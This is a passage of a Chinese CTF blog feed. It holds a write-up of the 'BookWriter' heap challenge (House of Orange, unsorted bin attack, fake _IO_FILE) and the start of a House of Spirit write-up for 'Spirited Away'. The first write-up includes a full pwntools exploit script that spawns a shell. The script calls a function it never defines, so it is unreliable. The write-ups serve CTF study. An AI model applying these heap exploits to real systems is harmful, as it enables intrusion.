chunk可能没有初始化，所以可能<code>old_size</code>为 0。 </li><li>如果top chunk已经初始化了，那么top chunk的大小必须大于等于<code>MINSIZE</code>，因为top chunk中包含了 fencepost，所以top chunk的大小必须要大于<code>MINSIZE</code>。</li><li>其次top chunk必须标识前一个chunk处于inuse状态.</li><li>并且top chunk的结束地址必定是页对齐的。</li><li>此外top chunk除去fencepost的大小必定要小于所需chunk的大小，否则在<code>_int_malloc</code>函数中会使用top chunk分割出chunk。<br><br>因此伪造的top chunk size需要满足：</li><li>伪造的size必须要对齐到内存页(0x1000)</li><li>size要大于<code>MINSIZE(0x10)</code></li><li>size要小于之后申请的<code>chunk size + MINSIZE(0x10)</code></li><li>size的<code>prev inuse</code>位必须为 1</li></ul><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin attack</h2><p>unsorted bins是一个双向链表，它采用的遍历顺序是FIFO，即插入时插在头部，取出时从尾部取。<br><br>当响应内存分配请求时，若small bin中不含符合要求的块，那么此时就会从unsorted bins中查找，如果有符合要求的，就会被取出来使用，其余的根据大小分别放在不同的bin中。<br><br>从unsorted bins中取块时，会将改该unsorted bin的bck-&gt;fd写为unsorted bins的地址（glibc2.23的版本下是<code>main_arena+0x58</code>，以后提及“unsorted bins的地址”，均用<code>main_arena+0x58</code>代替）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* remove from unsorted list *&#x2F;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd !&#x3D; victim))</span><br><span class="line">    malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk &#x3D; bck;</span><br><span class="line">bck-&gt;fd &#x3D; unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>于是只要伪造unsorted bin的bk的值，就能将<code>main_arena+0x58</code>写到bk的fd处。</p><p><img src="/2020/04/09/pwn-heap-BookWriter/unsorted_bin_attack_order.png" alt></p><p>事实上，一般在配合House of orange的情况下，一般会选择将<code>_IO_list_all</code>更改为<code>main_arena+0x58</code>，而此时<code>_IO_list_all-&gt;_chains</code>正好指向<code>main_arena</code>中size为0x60的smallbin。</p><h2 id="fake-IO-FILE-and-vtable"><a href="#fake-IO-FILE-and-vtable" class="headerlink" title="fake _IO_FILE and vtable"></a>fake _IO_FILE and vtable</h2><p>前面提到<code>_IO_list_all-&gt;_chains</code>正好指向<code>main_arena</code>中size为0x60的smallbin，那么只要伪造出对应的smallbin为<code>struct _IO_FILE</code>以及伪造出相应的<code>vtable</code>地址以及<code>vtable</code>内容，就可以达到getshell的目的。<br><br>因为这题是glibc2.23，所以不存在对vtable的check，所以vtable也可以随意构造。至于更高的glibc版本（如glibc2.24），存在一些相应的对vtable的检查机制，构造vtable会有困难，解决方案可以参考<a href="https://n0nop.com/2020/02/07/pwn-heap-melody-center/#利用思路" target="_blank" rel="noopener">melody_center</a>。<br><br>对于<code>_IO_FILE</code>的构造，需要满足以下条件：</p><ul><li><code>fp-&gt;_mode</code> = 0</li><li><code>fp-&gt;_IO_write_ptr</code> &lt; <code>fp-&gt;_IO_write_base</code></li><li><code>fp-&gt;_IO_read_ptr</code> = 0x61                     smallbin with size 0x60</li><li><code>fp-&gt;_IO_read_base</code> = <code>_IO_list_all-0x10</code>     _IO_list_all ==&gt; main_arena+0x58</li><li><code>vtable-&gt;_IO_OVERFLOW</code> = <code>system</code>             _IO_OVERFLOW(fp);</li><li><code>fp</code> start with “/bin/sh\x00”<br><br>显然对于glibc2.24中利用<code>_IO_str_jumps</code>的方法，对于glibc2.23同样适用。</li></ul><h1 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h1><ul><li><code>edit</code>功能中由于会根据<code>strlen</code>重新设置可读入的长度，因此可以在长度包含next chunk的size域的时候，可以完成对next chunk的size字段的修改，这里是更改top chunk的size，使其在下一次分配更大的空间的时候，被free到unsorted bin中。</li><li>由于malloc出的chunk里的内容不会被清0，因此在从unsorted bin中分配内存时，只要将原fd字段用字符填满，即可利用<code>view</code>功能leak出bk处的<code>main_arena</code>相关地址，从而得到libc的基地址。</li><li><code>add</code>功能中对个数判断存在漏洞，即bss上的储存chunk的空间只有8个，而这里可以分配第九个也就是<code>chunk_array[8]</code>，而<code>chunk_array[8]</code>其实就是<code>chunk_size[0]</code>，只要利用<code>edit</code>功能中对size的改写将<code>chunk_size[0]</code>变为0（通过输入’\x00’开头可以做到），就可以将<code>chunk_size[0]</code>overwrite为堆地址，从而可以接受更多输入，这一点很重要，因为后面修改伪造<code>_IO_FILE</code>，<code>vtable</code>以及smallbin需要用到。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt; <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"You can't add new page anymore!"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !chunk_array[i] )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>接下来就是构造<code>_IO_FILE</code>结构体了，因为这里没有选择leak heap address，也就没有选择在堆块中伪造<code>vtable</code>，还是选择利用<code>_IO_str_jumps</code><del>其实就是偷个懒，用一下之前写过的脚本</del>。其实可以通过author name把紧跟着的<code>chunk_array[0]</code>打印出来，然后伪造<code>vtable</code>，然后利用<code>_IO_OVERFLOW(fp)</code>…</li></ul><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_name</span><span class="params">(name)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">"Author :"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Size of page :"</span>, str(size))</span><br><span class="line">    p.sendafter(<span class="string">"Content :"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index of page :"</span>, str(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index of page :"</span>, str(index))</span><br><span class="line">    p.sendafter(<span class="string">"Content:"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(choice, name)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Do you want to change the author ? (yes:1 / no:0) "</span>, str(choice))</span><br><span class="line">    <span class="keyword">if</span> choice == <span class="number">1</span>:</span><br><span class="line">        p.sendafter(<span class="string">"Author :"</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span><span class="params">(_flags = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_read_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_ptr = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_write_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_buf_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_backup_base = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_save_end = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_marker = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _IO_chain = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _fileno = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _lock = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _wide_data = <span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">              _mode = <span class="number">0</span>)</span>:</span></span><br><span class="line">    file_struct = p32(_flags) + \</span><br><span class="line">                  p32(<span class="number">0</span>) + \</span><br><span class="line">                  p64(_IO_read_ptr) + \</span><br><span class="line">                  p64(_IO_read_end) + \</span><br><span class="line">                  p64(_IO_read_base) + \</span><br><span class="line">                  p64(_IO_write_base) + \</span><br><span class="line">                  p64(_IO_write_ptr) + \</span><br><span class="line">                  p64(_IO_write_end) + \</span><br><span class="line">                  p64(_IO_buf_base) + \</span><br><span class="line">                  p64(_IO_buf_end) + \</span><br><span class="line">                  p64(_IO_save_base) + \</span><br><span class="line">                  p64(_IO_backup_base) + \</span><br><span class="line">                  p64(_IO_save_end) + \</span><br><span class="line">                  p64(_IO_marker) + \</span><br><span class="line">                  p64(_IO_chain) + \</span><br><span class="line">                  p32(_fileno)</span><br><span class="line">      </span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0x88</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_lock)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xa0</span>, <span class="string">"\x00"</span>)</span><br><span class="line">    file_struct += p64(_wide_data)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xc0</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    file_struct += p64(_mode)</span><br><span class="line">    file_struct = file_struct.ljust(<span class="number">0xd8</span>, <span class="string">"\x00"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> file_struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file_with_vtable</span><span class="params">(_IO_str_jumps_addr, _IO_list_all_ptr, main_arena_addr, system_addr, binsh_addr)</span>:</span></span><br><span class="line">    payload = pack_file(_flags = <span class="number">0</span>,</span><br><span class="line">                        _IO_read_ptr = <span class="number">0x61</span>, <span class="comment">#smallbin5file_size</span></span><br><span class="line">                        _IO_read_end = main_arena_addr,</span><br><span class="line">                        _IO_read_base = _IO_list_all_ptr - <span class="number">0x10</span>, <span class="comment"># unsorted bin attack _IO_list_all_ptr,</span></span><br><span class="line">                        _IO_write_base = <span class="number">0</span>,</span><br><span class="line">                        _IO_write_ptr = <span class="number">1</span>,</span><br><span class="line">                        _IO_buf_base = binsh_addr,</span><br><span class="line">                        _mode = <span class="number">0</span>,</span><br><span class="line">                        )</span><br><span class="line"></span><br><span class="line">    payload += p64(_IO_str_jumps_addr - <span class="number">8</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) <span class="comment"># paddding</span></span><br><span class="line">    payload += p64(system_addr)</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3c3b20</span></span><br><span class="line">system_offset = libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">str_bin_sh_offset = libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line">_IO_list_all_offset = libc.symbols[<span class="string">"_IO_list_all"</span>]</span><br><span class="line">_IO_str_jumps_offset = <span class="number">0x3c27a0</span></span><br><span class="line"></span><br><span class="line">set_name(<span class="string">"AAA"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># House of orange</span></span><br><span class="line"><span class="comment"># overwrite top chunk size</span></span><br><span class="line"><span class="comment"># make the chunk_size[0] = 0</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"AAAA"</span>) <span class="comment"># chunk 0</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"A"</span> * <span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"\x00"</span> * <span class="number">0x38</span> + <span class="string">"\xc1\x0f\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># free a unsorted bin</span></span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">"BBBB"</span>) <span class="comment"># chunk 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc from unsorted bin</span></span><br><span class="line"><span class="comment"># leak main_arena address</span></span><br><span class="line">add(<span class="number">0xf8</span>, <span class="string">"C"</span> * <span class="number">8</span>) <span class="comment"># chunk 2</span></span><br><span class="line">view(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">"C"</span> * <span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = main_arena - main_arena_offset - <span class="number">0x668</span></span><br><span class="line">_IO_list_all = libc_base + _IO_list_all_offset</span><br><span class="line">_IO_str_jumps = libc_base + _IO_str_jumps_offset</span><br><span class="line">libc_system = libc_base + system_offset</span><br><span class="line">str_bin_sh = libc_base + str_bin_sh_offset</span><br><span class="line"></span><br><span class="line"><span class="comment"># malloc left 5 chunks</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">    add(<span class="number">0x18</span>, <span class="string">"DDDD"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite chunk_size[0] to a heap address</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"EEEE"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake _IO_FILE struct </span></span><br><span class="line"><span class="comment"># make sure chunk_size[0] = 0 again, so that we can malloc once again to trigger error</span></span><br><span class="line">payload = <span class="string">"\x00"</span> * <span class="number">0x1f0</span></span><br><span class="line">payload += pack_file_flush_str_jumps(_IO_str_jumps, _IO_list_all, main_arena - <span class="number">0x610</span>, libc_system, str_bin_sh)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger error</span></span><br><span class="line">p.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"Size of page :"</span>, str(<span class="number">0x18</span>))</span><br><span class="line"></span><br><span class="line">success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line">success(<span class="string">"_IO_list_all: "</span> + hex(_IO_list_all))</span><br><span class="line">success(<span class="string">"_IO_str_jumps: "</span> + hex(_IO_str_jumps))</span><br><span class="line">success(<span class="string">"libc_system: "</span> + hex(libc_system))</span><br><span class="line">success(<span class="string">"str_bin_sh: "</span> + hex(str_bin_sh))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ul><li>很奇怪，本地还是打不通，明明都断在<code>system</code>里面了，参数<code>rdi</code>也是对的，而且远程也是概率性打通。</li><li>调试的时候，leak出来的libc地址不是预期的<code>main_arena+0x58</code>的值，而是会大0x610，还没搞清楚原因。</li></ul><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_orange-zh/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unsorted_bin_attack-zh/</a></li><li><a href="https://xz.aliyun.com/t/2411" target="_blank" rel="noopener">https://xz.aliyun.com/t/2411</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;典型的House of orange + unsorted bin attack + _IO_FILE，之前在&lt;a href=&quot;https://n0nop.com/2020/02/07/pwn-heap-melody-center/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;melody_center&lt;/a&gt;中有写过，基本是一样的，除了一些利用的细节。权当是练习了，毕竟第一次接触的时候，写起来有点吃力。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Writeup" scheme="https://n0nop.github.io/categories/Writeup/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn heap: Spirited Away</title>
    <link href="https://n0nop.github.io/2020/04/08/pwn-heap-Spirited-Away/"/>
    <id>https://n0nop.github.io/2020/04/08/pwn-heap-Spirited-Away/</id>
    <published>2020-04-08T04:55:25.000Z</published>
    <updated>2020-04-08T06:00:01.891Z</updated>
    
    <content type="html"><![CDATA[<p>House of spirit attack，题目名字说明了一切。</p><a id="more"></a><h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><p>32位程序，基本没开啥保护。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>就一个评论功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">survey</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v1; <span class="comment">// [sp+10h] [bp-E8h]@2</span></span><br><span class="line">    <span class="keyword">size_t</span> nbytes; <span class="comment">// [sp+48h] [bp-B0h]@1</span></span><br><span class="line">    <span class="keyword">size_t</span> v3; <span class="comment">// [sp+4Ch] [bp-ACh]@1</span></span><br><span class="line">    <span class="keyword">char</span> s; <span class="comment">// [sp+50h] [bp-A8h]@2</span></span><br><span class="line">    <span class="keyword">int</span> v5; <span class="comment">// [sp+A0h] [bp-58h]@2</span></span><br><span class="line">    <span class="keyword">void</span> *buf; <span class="comment">// [sp+A4h] [bp-54h]@2</span></span><br><span class="line">    <span class="keyword">int</span> v7; <span class="comment">// [sp+A8h] [bp-50h]@2</span></span><br><span class="line"></span><br><span class="line">    nbytes = <span class="number">0x3C</span>;</span><br><span class="line">    v3 = <span class="number">0x50</span>;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x50</span>u);</span><br><span class="line">    buf = <span class="built_in">malloc</span>(<span class="number">0x3C</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nPlease enter your name: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, nbytes);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter your age: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Why did you came to see this movie? "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;v7, v3);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please enter your comment: "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, &amp;s, nbytes);</span><br><span class="line">    ++cnt;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Name: %s\n"</span>, buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Age: %d\n"</span>, v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reason: %s\n"</span>, &amp;v7);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Comment: %s\n\n"</span>, &amp;s);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;v1, <span class="string">"%d comment so far. We will review them as soon as we can"</span>, cnt);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;v1);</span><br><span class="line">    <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( cnt &gt; <span class="number">199</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"200 comments is enough!"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Would you like to leave another comment? &lt;y/n&gt;: "</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;choice, <span class="number">3u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( choice == <span class="string">'Y'</span> || choice == <span class="string">'y'</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">free</span>(buf);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( choice == <span class="string">'N'</span> || choice == <span class="string">'n'</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Wrong choice."</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Bye!"</span>);</span><br><span class="line">    <span class="keyword">return</span> fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>依次输入<code>name</code>, <code>age</code>, <code>reason</code>, <code>comment</code>然后会依次输出，并且会把字符串”%d comment so far. We will review them as soon as we can”放在v1里面，如果继续评论的话，<code>buf</code>会先<code>free</code>然后再重新<code>malloc</code>。</p><h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><h2 id="House-of-spirit-攻击原理"><a href="#House-of-spirit-攻击原理" class="headerlink" title="House of spirit 攻击原理"></a>House of spirit 攻击原理</h2><p>House of spirit是fastbin attack中的一种，主要是free出一个目标地址的fastbin出来，然后再malloc从而达到任意地址写的目的。<br><br>需要绕过的一些检测：</p><ul><li><code>fake chunk</code>的<code>ISMMAP</code>位(size的第2个bit）不能为1，因为free时，如果是<code>mmap</code>的chunk，会单独处理。  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    munmap_chunk (p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>fake chunk</code>地址需要对齐<code>MALLOC_ALIGN_MASK</code>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="keyword">uintptr_t</span>) p &gt; (<span class="keyword">uintptr_t</span>) -<span class="built_in">size</span>, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span 